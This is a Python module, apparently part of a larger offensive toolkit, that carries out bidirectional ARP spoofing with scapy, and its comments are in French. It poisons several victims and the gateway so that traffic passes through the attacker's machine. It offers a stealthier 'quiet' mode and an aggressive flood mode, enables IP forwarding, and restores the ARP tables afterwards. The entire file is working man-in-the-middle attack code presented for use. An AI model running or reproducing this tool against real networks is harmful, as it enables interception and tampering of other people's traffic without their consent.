"""
modules/arp_spoof.py
ARP Spoofing Bi-directionnel Ultra-Robuste.
- Multi-cibles simultanées
- Mode quiet (réponse aux ARP requests uniquement)
- Mode agressif (flood continu)
- Restauration garantie à l'arrêt
- Threading propre avec gestion des erreurs
"""
import time
import threading
from typing import List, Dict, Optional, Set
from dataclasses import dataclass, field
from scapy.all import send, sendp, sniff, ARP, Ether, srp

from core.logger import log
from core.config import conf, attack_conf
from core.mitigation import SystemControl
from core.network import NetworkDiscovery


@dataclass
class VictimInfo:
    """Informations sur une victime."""
    ip: str
    mac: str
    hostname: str = ""
    packets_sent: int = 0
    last_spoof: float = 0.0


class ARPSpoofer:
    """
    ARP Spoofer professionnel multi-cibles.
    
    Modes d'opération:
    - Normal: Envoie des ARP replies périodiquement
    - Quiet: Répond uniquement aux ARP requests (plus furtif)
    - Aggressive: Flood ARP constant (plus efficace mais détectable)
    """
    
    def __init__(
        self,
        targets: List[str] = None,
        gateway_ip: str = None,
        quiet_mode: bool = False,
        aggressive: bool = False,
        interval: float = None
    ):
        """
        :param targets: Liste des IPs victimes (None = utilise conf.targets)
        :param gateway_ip: IP de la gateway (None = utilise conf.gateway_ip)
        :param quiet_mode: Si True, répond uniquement aux ARP requests
        :param aggressive: Si True, envoie des paquets très rapidement
        :param interval: Intervalle entre les paquets (override)
        """
        self.target_ips: List[str] = targets or []
        self.gateway_ip: str = gateway_ip or conf.gateway_ip
        self.quiet_mode: bool = quiet_mode
        self.aggressive: bool = aggressive
        self.interval: float = interval or attack_conf.ARP_INTERVAL
        
        if aggressive:
            self.interval = 0.3  # 300ms en mode agressif
        
        # État
        self.running: bool = False
        self.victims: Dict[str, VictimInfo] = {}
        self.gateway_mac: str = ""
        self.attacker_mac: str = conf.attacker_mac
        
        # Threading
        self._spoof_thread: Optional[threading.Thread] = None
        self._quiet_thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()
        
        # Stats
        self.total_packets_sent: int = 0
        self.start_time: float = 0.0
    
    def _resolve_targets(self) -> bool:
        """Résout les adresses MAC de toutes les cibles."""
        log.info(f"Résolution MAC de {len(self.target_ips)} cible(s)...")
        
        # Résoudre la gateway d'abord
        if not self.gateway_mac:
            self.gateway_mac = conf.gateway_mac or NetworkDiscovery.resolve_mac(self.gateway_ip)
            if not self.gateway_mac:
                log.error(f"Impossible de résoudre la MAC de la gateway {self.gateway_ip}")
                return False
        
        # Résoudre les victimes
        macs = NetworkDiscovery.resolve_macs_batch(self.target_ips)
        
        for ip in self.target_ips:
            if ip in macs:
                self.victims[ip] = VictimInfo(ip=ip, mac=macs[ip])
                log.info(f"  → {ip} = {macs[ip]}")
            else:
                log.warning(f"  → {ip} = INACCESSIBLE (ignoré)")
        
        if not self.victims:
            log.error("Aucune victime accessible!")
            return False
        
        return True
    
    def _poison_victim(self, victim: VictimInfo):
        """
        Empoisonne une victime (ARP Spoofing bi-directionnel).
        Envoie 2 paquets:
        1. À la victime: "La gateway est à MON adresse MAC"
        2. À la gateway: "La victime est à MON adresse MAC"
        """
        try:
            # Paquet vers la victime
            # "Je suis la gateway" (op=2 = is-at reply)
            pkt_to_victim = Ether(dst=victim.mac) / ARP(
                op=2,
                pdst=victim.ip,
                hwdst=victim.mac,
                psrc=self.gateway_ip,
                hwsrc=self.attacker_mac  # Notre MAC!
            )
            
            # Paquet vers la gateway
            # "Je suis la victime"
            pkt_to_gateway = Ether(dst=self.gateway_mac) / ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=victim.ip,
                hwsrc=self.attacker_mac  # Notre MAC!
            )
            
            # Envoyer les paquets
            sendp(pkt_to_victim, iface=conf.interface, verbose=False)
            sendp(pkt_to_gateway, iface=conf.interface, verbose=False)
            
            # Stats
            with self._lock:
                victim.packets_sent += 2
                victim.last_spoof = time.time()
                self.total_packets_sent += 2
        
        except Exception as e:
            log.warning(f"Erreur spoofing {victim.ip}: {e}")
    
    def _spoof_loop(self):
        """Boucle principale de spoofing (mode normal/agressif)."""
        log.attack("ARP Spoofing démarré - Mode " + ("AGRESSIF" if self.aggressive else "NORMAL"))
        
        while self.running:
            for victim in self.victims.values():
                if not self.running:
                    break
                self._poison_victim(victim)
            
            # Pause entre les cycles
            if self.running:
                time.sleep(self.interval)
    
    def _quiet_loop(self):
        """
        Mode quiet: Sniffe les ARP requests et répond uniquement à celles-ci.
        Plus furtif car on ne flood pas le réseau.
        """
        log.attack("ARP Spoofing démarré - Mode QUIET (réponse aux requests)")
        
        def handle_arp_request(pkt):
            if not self.running:
                return
            
            if ARP not in pkt:
                return
            
            # On s'intéresse aux ARP WHO-HAS (op=1)
            if pkt[ARP].op != 1:
                return
            
            src_ip = pkt[ARP].psrc
            dst_ip = pkt[ARP].pdst
            
            # Cas 1: Une victime demande la MAC de la gateway
            if src_ip in self.victims and dst_ip == self.gateway_ip:
                victim = self.victims[src_ip]
                # Répondre avec notre MAC
                reply = Ether(dst=victim.mac) / ARP(
                    op=2,
                    pdst=victim.ip,
                    hwdst=victim.mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.attacker_mac
                )
                sendp(reply, iface=conf.interface, verbose=False)
                with self._lock:
                    victim.packets_sent += 1
                    self.total_packets_sent += 1
            
            # Cas 2: La gateway demande la MAC d'une victime
            elif src_ip == self.gateway_ip and dst_ip in self.victims:
                reply = Ether(dst=self.gateway_mac) / ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=dst_ip,
                    hwsrc=self.attacker_mac
                )
                sendp(reply, iface=conf.interface, verbose=False)
                with self._lock:
                    self.total_packets_sent += 1
        
        try:
            sniff(
                iface=conf.interface,
                filter="arp",
                prn=handle_arp_request,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception as e:
            if self.running:
                log.error(f"Erreur sniff ARP: {e}")
    
    def _restore_single(self, victim: VictimInfo):
        """Restaure la table ARP d'une victime."""
        SystemControl.restore_arp(
            victim.ip,
            self.gateway_ip,
            victim.mac,
            self.gateway_mac
        )
    
    def _restore_all(self):
        """Restaure les tables ARP de toutes les victimes."""
        log.info("Restauration des tables ARP...")
        
        for victim in self.victims.values():
            self._restore_single(victim)
        
        log.success(f"Tables ARP restaurées pour {len(self.victims)} machine(s)")
    
    def start(self) -> bool:
        """
        Démarre l'ARP Spoofing.
        Retourne True si démarré avec succès.
        """
        if self.running:
            log.warning("ARP Spoofing déjà actif")
            return True
        
        # Vérifications préalables
        if not self.target_ips:
            log.error("Aucune cible spécifiée!")
            return False
        
        if not self.gateway_ip:
            log.error("Gateway non configurée!")
            return False
        
        if not self.attacker_mac:
            self.attacker_mac = conf.attacker_mac
            if not self.attacker_mac:
                log.error("MAC attaquant non configurée!")
                return False
        
        # Résoudre les MACs
        if not self._resolve_targets():
            return False
        
        # Activer IP Forwarding
        if not SystemControl.set_ip_forwarding(True):
            log.warning("IP Forwarding peut ne pas être actif - le trafic pourrait être bloqué")
        
        # Enregistrer le cleanup
        SystemControl.register_cleanup(self.stop)
        
        # Démarrer le spoofing
        self.running = True
        self.start_time = time.time()
        conf.arp_spoofing_active = True
        
        if self.quiet_mode:
            self._quiet_thread = threading.Thread(target=self._quiet_loop, daemon=True)
            self._quiet_thread.start()
            
            # En mode quiet, on doit quand même faire un empoisonnement initial
            for victim in self.victims.values():
                self._poison_victim(victim)
        else:
            self._spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
            self._spoof_thread.start()
        
        log.success(f"MITM actif sur {len(self.victims)} cible(s)")
        return True
    
    def stop(self):
        """Arrête l'ARP Spoofing et restaure le réseau."""
        if not self.running:
            return
        
        log.info("Arrêt de l'ARP Spoofing...")
        self.running = False
        conf.arp_spoofing_active = False
        
        # Attendre les threads
        if self._spoof_thread and self._spoof_thread.is_alive():
            self._spoof_thread.join(timeout=3.0)
        
        if self._quiet_thread and self._quiet_thread.is_alive():
            self._quiet_thread.join(timeout=3.0)
        
        # Restaurer les ARP
        self._restore_all()
        
        # Stats finales
        duration = time.time() - self.start_time if self.start_time else 0
        log.success(
            f"ARP Spoofing arrêté. "
            f"Durée: {duration:.1f}s, "
            f"Paquets envoyés: {self.total_packets_sent}"
        )
    
    def add_target(self, ip: str) -> bool:
        """Ajoute une cible à chaud."""
        if ip in self.victims:
            return True
        
        mac = NetworkDiscovery.resolve_mac(ip)
        if not mac:
            log.warning(f"Impossible d'ajouter {ip}: MAC non résolue")
            return False
        
        with self._lock:
            self.victims[ip] = VictimInfo(ip=ip, mac=mac)
            self.target_ips.append(ip)
        
        log.info(f"Cible ajoutée: {ip} ({mac})")
        
        # Empoisonnement immédiat
        self._poison_victim(self.victims[ip])
        return True
    
    def remove_target(self, ip: str) -> bool:
        """Retire une cible et restaure sa table ARP."""
        if ip not in self.victims:
            return False
        
        with self._lock:
            victim = self.victims.pop(ip)
            if ip in self.target_ips:
                self.target_ips.remove(ip)
        
        # Restaurer cette victime
        self._restore_single(victim)
        log.info(f"Cible retirée: {ip}")
        return True
    
    def get_stats(self) -> dict:
        """Retourne les statistiques de l'attaque."""
        return {
            "running": self.running,
            "mode": "quiet" if self.quiet_mode else ("aggressive" if self.aggressive else "normal"),
            "victims": len(self.victims),
            "packets_sent": self.total_packets_sent,
            "duration": time.time() - self.start_time if self.start_time else 0,
            "per_victim": {
                ip: {"mac": v.mac, "packets": v.packets_sent}
                for ip, v in self.victims.items()
            }
        }
    
    def __enter__(self):
        """Support du context manager (with statement)."""
        self.start()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Arrêt automatique à la sortie du context."""
        self.stop()
        return False